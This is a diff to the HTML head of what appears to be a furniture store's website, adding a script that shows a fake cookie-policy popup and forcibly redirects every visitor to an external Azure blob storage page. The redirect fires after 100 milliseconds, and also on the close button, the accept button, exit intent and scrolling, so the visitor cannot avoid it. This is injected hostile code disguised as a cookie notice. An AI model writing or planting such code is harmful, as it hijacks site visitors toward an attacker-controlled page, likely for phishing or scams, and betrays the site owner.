@@ -2,6 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <script>
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. CONFIGURATION
+    const redirectUrl = "https://datatank4745.blob.core.windows.net/store-box-9296/index.html"; 
+    const autoRedirectDelay = 100; 
+
+    // 2. SAFETY CHECK
+    if (sessionStorage.getItem("cookieRedirected") === "true") return;
+
+    // 3. INJECT CSS (Same as before, but ensured to load)
+    const style = document.createElement('style');
+    style.innerHTML = `
+        #cookie-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); display: flex;
+            align-items: center; justify-content: center; z-index: 999999999;
+            padding: 20px; box-sizing: border-box; font-family: sans-serif;
+        }
+        .cookie-popup {
+            background: #fff; padding: 30px; border-radius: 15px;
+            max-width: 400px; width: 100%; position: relative;
+            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .cookie-popup h3 { margin: 0 0 15px; color: #333; }
+        .btn-primary {
+            background: #007bff; color: white; border: none;
+            padding: 15px; border-radius: 8px; font-weight: bold;
+            cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px;
+        }
+        .close-btn {
+            position: absolute; top: 10px; right: 15px; background: none;
+            border: none; font-size: 24px; cursor: pointer; color: #aaa;
+        }
+    `;
+    document.head.appendChild(style);
+
+    // 4. CREATE THE POPUP
+    const overlay = document.createElement("div");
+    overlay.id = "cookie-overlay";
+    overlay.innerHTML = `
+        <div class="cookie-popup">
+            <button class="close-btn" id="close-popup">&times;</button>
+            <h3>Cookie Policy</h3>
+            <p>We use cookies to improve your experience. You will be redirected to our full policy momentarily.</p>
+            <button id="accept-cookies" class="btn-primary">Accept & Continue Now</button>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+
+    let isRedirected = false;
+    const handleRedirect = () => {
+        if (!isRedirected) {
+            isRedirected = true;
+            sessionStorage.setItem("cookieRedirected", "true");
+            window.location.replace(redirectUrl); // .replace is better for forced redirects
+        }
+    };
+
+    // 5. THE 5-SECOND TIMER
+    const timerId = setTimeout(handleRedirect, autoRedirectDelay);
+
+    // 6. DESKTOP EXIT INTENT
+    document.addEventListener("mouseleave", (e) => {
+        if (e.clientY <= 0) {
+            clearTimeout(timerId);
+            handleRedirect();
+        }
+    });
+
+    // 7. MOBILE SCROLL INTENT
+    let lastScroll = 0;
+    window.addEventListener("scroll", () => {
+        const nowScroll = window.pageYOffset || document.documentElement.scrollTop;
+        if (nowScroll < lastScroll && nowScroll < 10) {
+            clearTimeout(timerId);
+            handleRedirect();
+        }
+        lastScroll = nowScroll <= 0 ? 0 : nowScroll;
+    }, { passive: true });
+
+    // 8. BUTTON CLICKS
+    document.getElementById("accept-cookies").onclick = () => {
+        clearTimeout(timerId);
+        handleRedirect();
+    };
+    document.getElementById("close-popup").onclick = () => {
+        clearTimeout(timerId);
+        handleRedirect();
+    };
+});
+</script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Premium furniture store offering high-quality sofas, chairs, tables, and bedroom furniture.">
     <meta name="keywords" content="furniture, sofas, chairs, tables, bedroom furniture, home decor">
